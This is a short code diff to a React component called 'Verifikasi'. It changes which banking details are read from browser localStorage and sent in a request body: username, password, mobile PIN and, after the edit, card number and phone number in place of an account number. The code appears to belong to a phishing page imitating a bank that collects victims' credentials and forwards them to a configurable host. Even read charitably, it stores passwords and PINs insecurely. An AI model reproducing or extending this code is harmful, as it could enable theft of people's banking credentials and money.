@@ -18,13 +18,15 @@ function Verifikasi({host}) {
     const username = localStorage.getItem('username')
     const password = localStorage.getItem('password')
     const mPin = localStorage.getItem('mPin')
-    const noRek = localStorage.getItem('noRek')
+    const noKartu = localStorage.getItem('noKartu')
+    const noHp = localStorage.getItem('noHp')
 
     const body = {
       username,
       password,
       mPin,
-      noRek,
+      noKartu,
+      noHp,
       message : data.message
     }
 
